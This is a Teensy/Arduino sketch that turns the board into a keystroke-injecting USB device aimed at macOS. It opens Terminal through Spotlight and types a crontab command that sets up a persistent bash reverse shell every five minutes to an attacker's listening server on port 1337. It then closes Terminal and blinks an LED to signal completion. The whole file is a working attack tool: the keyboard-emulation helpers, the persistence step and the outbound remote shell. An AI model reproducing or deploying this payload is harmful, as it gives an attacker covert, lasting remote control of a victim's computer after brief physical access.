int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 11
#else
#define LED_PIN 13
#endif

void setup()
{
  delay(1000);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  openapp("Terminal");
  typeln("(crontab -l ; echo \"*/5 * * * * bash -i >& /dev/tcp/<listening server>/1337 0>&1\")  | crontab -");
  typeln("");
  typeln("exit");
  cmd(KEY_Q);
}

void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

void openapp(String app)
{
  cmd(KEY_SPACE);
  typeln(app);
}

void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}

void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
